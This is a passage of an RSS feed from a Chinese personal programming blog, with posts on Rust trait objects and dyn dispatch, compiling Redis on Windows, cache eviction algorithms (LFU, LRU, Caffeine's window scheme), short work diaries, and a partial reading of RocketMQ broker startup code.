&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">View&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Button&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">View&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Text&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>我们看到&lt;code>Button&lt;/code>和&lt;code>Text&lt;/code>都实现了&lt;code>View&lt;/code>属性, 抽象是一种不错的设计程序的方法, 帮助我们透明化的使用外部提供的API. 然后我们可能会下意识的写出下面的代码:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Rust" data-lang="Rust">&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="sd">/// 这种代码实际上会让人感到疑惑. View究竟是个特性还是一个对象.
&lt;/span>&lt;span class="sd">/// 这里的View是一个类型, 所以我们需要写成 `impl View`.
&lt;/span>&lt;span class="sd">/// 不过`impl View` 不能用于多个trait实现的返回. 但是可以作为入参.
&lt;/span>&lt;span class="sd">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">something&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">View&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Button&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Text&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这段代码无法通过编译, 原因就是返回值&lt;code>View&lt;/code>需要在编译器确认大小. 我们需要把它装成一个胖指针.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">something&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Box&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">View&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{...}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>嗯,这样就好很多. 但是编译器会爆种, 提出一个警告, 希望你把&lt;code>Box&amp;lt;View&amp;gt;&lt;/code>改为&lt;code>Box&amp;lt;dyn View&amp;gt;&lt;/code>.&lt;/p>
&lt;p>这又是什么意思?&lt;/p>
&lt;p>&lt;code>dyn&lt;/code> 是动态的缩写, 意义其实很明显. 使用&lt;code>dyn&lt;/code>修饰的类型, 会在程序执行期动态分发. 会有一定的RUNTIME开销.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">something&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Box&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">dyn&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">View&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{...}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>现在我们把代码改成这样, 好多了.&lt;/p>
&lt;p>接下来说说&lt;code>impl&lt;/code>, 这个语法是个语法糖其实.怎么个语法糖呢?&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">something&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">View&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c1">// ------------- 用 impl 之后 ------------------
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">something&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span>: &lt;span class="nc">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">View&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">...&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>真的就这么简单.&lt;/p>
&lt;p>第二次说一遍, 这种&lt;code>T(泛型)&lt;/code>写法在入参可以这么做, 但是返回值不行. 除非你的返回值只返回一个&lt;code>T&lt;/code>实现. 两种以上请&lt;code>重载 (我乱说的,rust可能不支持)&lt;/code>或者使用&lt;code>dyn&lt;/code>.&lt;/p></description></item><item><title>Redis Compile</title><link>https://sdttttt.github.io/blog/redis-compile/</link><pubDate>Wed, 11 Nov 2020 16:43:06 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/redis-compile/</guid><description>
&lt;p>也不知道我发了什么疯, 在windows上编译了一遍redis. 事实上我找到的windows上最新的redis版本是3.&lt;/p>
&lt;p>这个版本以及相当老了. 目前最新的redis是在6. 我不想功能相差过大,就重新在windows上编译了一次.&lt;/p>
&lt;p>中间捣鼓了很久. 由于redis是在unix环境上开发的, windows上编译还是很麻烦. 首先试了&lt;code>cygwin&lt;/code>这个unix模拟环境可惜编译失败了. 后面我下载了&lt;code>msys2&lt;/code>这个unix的工具套件. 这次很顺利. redis6的包我就放在&lt;a href="https://github.com/adminwbb/adminwbb.github.io/releases/download/1/redis6.7z">这里&lt;/a>, 需要可以下载.&lt;/p></description></item><item><title>Log 9</title><link>https://sdttttt.github.io/blog/log-9/</link><pubDate>Wed, 11 Nov 2020 14:04:54 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-9/</guid><description>
&lt;p>上周周五学习了一个新的玩意，一个自动化测试类库（Selenium），作用也比较简单，在浏览器的网页上模拟鼠标和键盘输入操作。是个没啥难度也没啥营养的东西。就像换了个语言写Javascript一样。&lt;/p>
&lt;p>出乎意料的是这周的开头居然有歪果仁在我的GRC上提出了一些问题，我还以为这个项目会孤独终老，看起来还是有人在使用的。正好，趁着11.11换了个显示屏和键盘，等发工资就再买个PC主机，我就趁这段时间把目前GRC存在的问题解决了。&lt;/p>
&lt;p>最近也打算学习一下操作系统的知识，希望这个月顺利。&lt;/p></description></item><item><title>GRC 3</title><link>https://sdttttt.github.io/blog/grc-3/</link><pubDate>Tue, 03 Nov 2020 14:28:39 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/grc-3/</guid><description>
&lt;p>上周末算是把GRC扩展的部分开发完成了，
最开始写的时候没有遇到什么特别大的困难，
不禁感叹，我写Rust越来越顺手了已经.&lt;/p>
&lt;p>结果到星期六准备把几个模块接起来的时候，
发现出现了变量生命周期的问题，我还特地去找人问，
但根本没啥人鸟我。没办法，最后算是有意无意之间发现了解决的方法&amp;hellip;&lt;/p>
&lt;p>最后在星期六晚上总算是编写完成了已经，星期天的时候发布了。
可惜这几天的下载量都愁云惨淡&amp;hellip;&lt;/p></description></item><item><title>Log 8</title><link>https://sdttttt.github.io/blog/log-8/</link><pubDate>Thu, 29 Oct 2020 09:04:14 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-8/</guid><description>
&lt;p>每天上班, 先骑15分钟自行车到地铁再做20多分钟地铁, 针不戳.&lt;/p>
&lt;p>感觉体能下降的厉害.&lt;/p>
&lt;p>今天在博客仓库了增加了hugo模块。 以后看起来跟换主题会方便很多。
但是为啥有&lt;code>go.mod&lt;/code>文件。这又不是一个go项目&amp;hellip;&lt;/p></description></item><item><title>Log 7</title><link>https://sdttttt.github.io/blog/log-7/</link><pubDate>Wed, 28 Oct 2020 09:54:22 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-7/</guid><description>
&lt;p>尝试优化一下文章创建的脚本.&lt;/p></description></item><item><title>Log 6</title><link>https://sdttttt.github.io/blog/log-6/</link><pubDate>Tue, 27 Oct 2020 17:24:55 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-6/</guid><description>
&lt;p>最近仔细反思了一下, 还是去研究一些什么东西. sraft已经写的我头都大了.
我打算最近一段时间不再在Github上编写代码了.&lt;/p>
&lt;p>一方面是没有什么东西打得起我的兴趣, 另一方面还是觉得自己没有真正擅长的方面, 研究分布式系统这么长时间,
进展真的很慢, 一是我平时很懒, 不喜欢搭复杂的环境, 二是单纯的分布式方面的知识没有什么软用. 需要结合其他方面.&lt;/p>
&lt;p>潜了潜了. (当然博客还是会写www)&lt;/p></description></item><item><title>Cache Algorithm</title><link>https://sdttttt.github.io/blog/cache-algorithm/</link><pubDate>Mon, 26 Oct 2020 11:03:33 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/cache-algorithm/</guid><description>
&lt;p>本文主要讲的是目前存在的几种缓存算法, 没错, 我又来&lt;del>误人子弟&lt;/del>了.&lt;/p>
&lt;p>内容会围绕近几年比较流行的LFU, LRU, 还有W-TinyLRU这么三种缓存算法来讲, 尽量使用最简练的文本.&lt;/p>
&lt;h2 id="lfu">LFU&lt;/h2>
&lt;p>近期最少使用算法，即LFU算法（Least Frequently Used algorithm）。
这种算法会淘汰近期最少访问的缓存,
仔细分析一下, 没错，这是一种非常合理的算法，因为到目前为止最少使用的页面，
很可能也是将来最少访问的页面。
该算法既充分利用了内存中缓存调度情况的历史信息，又正确反映了程序的局部性。&lt;/p>
&lt;p>但是，这种算法的开销极其高, 为了记录每个缓存的使用情况, 你不得不为每一个缓存增加一个很大的计数器,
每次到达临界点, 我们还需要找到所有计数器中最少的缓存, 淘汰它.&lt;/p>
&lt;pre>&lt;code>核心思想：如果一个数据在最近一段时间内使用次数很少，那么在将来一段时间内被使用的可能性也很小.
&lt;/code>&lt;/pre>
&lt;p>通常我们会这么去实现:&lt;/p>
&lt;p>外部结构为&lt;code>Array&lt;/code>, 存储元素为&lt;code>KV&lt;/code>. &lt;code>K&lt;/code>: 该缓存访问次数. &lt;code>V&lt;/code>: 缓存本身.
数组按照K排序. 每次缓存大小即将临界, 淘汰&lt;code>K&lt;/code>最小的缓存.&lt;/p>
&lt;p>顺便一提 &lt;code>Window-LFU&lt;/code> 它是LFU算法的改良版. LFU中缓存的访问次数记录的时间范围为整个程序的生命周期,
在&lt;code>Window-LFU&lt;/code>中只对特定范围的访问次数进行淘汰. (比如最近10次访问的缓存.)&lt;/p>
&lt;h2 id="lru">LRU&lt;/h2>
&lt;p>最久没有使用算法，即LRU算法（Least Recently Used algorithm）。
这种算法把近期最久没有被访问过的页面作为被替换的页面。
它把LFU算法中要记录数量上的&amp;quot;多&amp;quot;与&amp;quot;少&amp;quot;简化成判断&amp;quot;有&amp;quot;与&amp;quot;无&amp;quot;，因此，实现起来比较容易。&lt;/p>
&lt;pre>&lt;code>核心思想：如果在一段时间内长时间不访问的页面将来也不会访问.
&lt;/code>&lt;/pre>
&lt;p>实现很简单:&lt;/p>
&lt;p>假设我们的缓存容量大小为2, 最多缓存2个元素.
下面是缓存的访问顺序.&lt;/p>
&lt;blockquote>
&lt;p>1 2 2 3&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>第一次: [1]&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>第二次: [2, 1]&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>第三次: [2, 1]&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>第四次: [3, 2]&lt;/p>
&lt;/blockquote>
&lt;p>最新访问的缓存会放在首位, 很久没有访问的缓存自然而然的就到了末尾, 然后被淘汰.&lt;/p>
&lt;h2 id="w-tinylru">W-TinyLRU&lt;/h2>
&lt;p>知名缓存框架 caffeine 就是使用的这种算法 这种算法结合LRU和LFU算法，解决了突发流量问题带来的。&lt;/p>
&lt;pre>&lt;code>整个算法数据结构分成三个段,分别为 Eden,Probation,Protected 三个队列
&lt;/code>&lt;/pre>
&lt;ul>
&lt;li>
&lt;p>Eden队列: 在caffeine中规定只能为缓存容量的%1,如果size=100,
那这个队列的有效大小就等于1。这个队列中记录的是新到的数据，
防止突发流量由于之前没有访问频率，而导致被淘汰。
比如有一部新剧上线，在最开始其实是没有访问频率的，
防止上线之后被其他缓存淘汰出去，而加入这个区域。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Probation队列:叫做缓刑队列，在这个队列就代表你的数据相对比较冷，马上就要被淘汰了。&lt;br>
这个有效大小为size减去eden减去protected。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Protected队列:在这个队列中，可以稍微放心一下了，你暂时不会被淘汰，
但是别急，如果Probation队列没有数据了或者Protected数据满了，
你也将会被面临淘汰的尴尬局面。当然想要变成这个队列，
需要把Probation访问一次之后，就会提升为Protected队列。
这个有效大小为(size减去eden) X 80% 如果size =100，就会是79。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>区域规则:&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>所有的新数据都会进入Eden。&lt;/li>
&lt;li>Eden满了，淘汰进入Probation。&lt;/li>
&lt;li>如果在Probation中访问了其中某个数据，则这个数据升级为Protected。&lt;/li>
&lt;li>如果Protected满了又会继续降级为Probation。&lt;/li>
&lt;/ol>
&lt;p>Probation的淘汰算法也比较有意思, 取出队尾和队首的元素, 然后让这两皇城PK, 输了就淘汰了.&lt;/p>
&lt;p>&lt;strong>皇城PK规则:&lt;/strong>&lt;/p>
&lt;pre>&lt;code>1.如果队尾元素的频度大于队首，那么就直接淘汰队首，
2.当队尾频度小于等于队首，且频度小于5的时候，直接将其淘汰
3.当队尾频度小于等于队首，且频度大于5的时候，通过随机的方式进行淘汰任意一个。(看谁运气好咯)
&lt;/code>&lt;/pre></description></item><item><title>Log 5</title><link>https://sdttttt.github.io/blog/log-5/</link><pubDate>Fri, 23 Oct 2020 16:44:07 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-5/</guid><description>
&lt;p>今天写了一天的sraft. 本来是自信满满，但是有些地方的设计真的让我焦头烂额.&lt;/p>
&lt;p>今天把sraft的rpc的网络通信部分换成了长连接。
但是写到节点发现的部分又有问题来了，我没有写关于处理节点发现之类的模块，
至今都是按照raft论文上的基础理论来实现的。&lt;/p>
&lt;p>这一块又要怎么设计呢&amp;hellip;
果然有些地方写的还是太复杂了么.&lt;/p></description></item><item><title>Log 4</title><link>https://sdttttt.github.io/blog/log-4/</link><pubDate>Thu, 22 Oct 2020 09:26:05 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-4/</guid><description>
&lt;p>昨天算是完成了第一个前端上需求.来讲讲成果吧.
(其实根本无关紧要)&lt;/p>
&lt;p>看了SVN记录,整个项目第一次提交是在2018年. (立项的时间感觉肯定更早)&lt;/p>
&lt;p>整体技术使用的基本时原生JS(没有ES6) + Jquery. 项目代码风格凌乱. 肯定有好几个人接手过了.&lt;/p>
&lt;p>每个页面还不是HTML&amp;hellip;是nm的JSP.(所以我才觉得应该不是2018年立项的)
所以整个项目都是在Tomcat上运行的.正常来说都是写成HTML然后跑在Nginx上.&lt;/p>
&lt;p>这次的需求就是在原来的页面上加一个新的按钮并且完善整个页面. 我看来那个页面的其他标签.用的基本是绝对定位布局..惊了&lt;/p>
&lt;p>这次我基本把原生JS完全复习了一遍. 我不太喜欢使用Jquery.因为感觉语法很奇怪, 可读性很差.&lt;/p>
&lt;p>还学到了一个新的库(GoJS)用来画图的.这个库入门很简单,但是要高度自定义使用还是有些困难的.&lt;/p>
&lt;p>唉, 我到底啥时候才能写后端嘞.&lt;/p></description></item><item><title>Log 3</title><link>https://sdttttt.github.io/blog/log-3/</link><pubDate>Wed, 21 Oct 2020 08:55:36 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/log-3/</guid><description>
&lt;p>细心的人可能注意到我这几天都在写JS, 因为这边的公司人手其实缺乏很严重,
很多都是做后端的, 而且后端并不是全部Java, 有相当部分是Python写的.&lt;/p>
&lt;p>我在大学期间为了选择以后的WEB方向, 一狠心把当时比较前沿的WEB技术全部学了一遍, 包括前端的一些框架,
最后选择了WEB后端, 语言为Go, 或者Java. 也算半个全栈吧.&lt;/p>
&lt;p>这个公司正好是发挥了我所有的技能..不过这边的JS大部分都是原生的, 我比较习惯用ES6的写法.&lt;/p></description></item><item><title>RocketMQ 3.3.4 Broker</title><link>https://sdttttt.github.io/blog/rocketmq-comments/</link><pubDate>Tue, 13 Oct 2020 16:56:11 +0800</pubDate><author>sdttttt</author><guid>https://sdttttt.github.io/blog/rocketmq-comments/</guid><description>
&lt;p>差不多可以看消息队列的源码了。
在下从gitee上找到了rocketmq的早期版本（3.2.2），
坏消息是这个2014年的项目里没有单元测试极少, 调试会比较困难.
好消息是这个时候的RocketMQ还没开源多久，里面有很多中文注释。看起来会很舒服。&lt;/p>
&lt;p>我们从Broker开始涂鸦。关于RocketMQ中每个角色的作用这里不再陈述：&lt;/p>
&lt;p>先从初始化开始：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">String&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">start&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">createBrokerController&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">));&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>rocketmq是从&lt;code>commandline&lt;/code>启动的，&lt;code>createBrokerController&lt;/code>函数比较长，
会有很多额外的逻辑干扰你，我这里直接说重点：&lt;/p>
&lt;ul>
&lt;li>读取环境变量，没有就用默认值。&lt;/li>
&lt;li>解析命令行参数。&lt;/li>
&lt;li>初始化配置类。&lt;/li>
&lt;li>打印默认配置内容。&lt;/li>
&lt;li>检查NameServer地址设置是否正确。&lt;/li>
&lt;li>检查broker的类型（master，slave）&lt;/li>
&lt;li>初始化日志配置类。&lt;/li>
&lt;li>再次打印。&lt;/li>
&lt;li>初始化服务控制对象.&lt;/li>
&lt;li>最后增加一个关闭Broker时触发的hook.&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>服务控制对象： Broker各个服务控制器，包括存储层配置，配置文件版本号，消费进度存储，Consumer连接、订阅关系管理等等。&lt;/p>
&lt;/blockquote>
&lt;p>以上就是&lt;code>createBrokerController&lt;/code>的内容，函数虽然长，但是并不复杂。&lt;/p>
&lt;p>下面为&lt;code>start&lt;/code>函数的内容, 在&lt;code>main&lt;/code>中的&lt;code>start&lt;/code>函数实际上是去委托了&lt;code>BrokerController&lt;/code>去执行.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-java" data-lang="java"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">start&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">Exception&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 启动Broker的各层服务
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">messageStore&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">messageStore&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">start&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">remotingServer&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">remotingServer&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">start&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">brokerOuterAPI&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">brokerOuterAPI&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">start&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">pullRequestHoldService&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">this&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">pullRequestHoldService&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">start&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
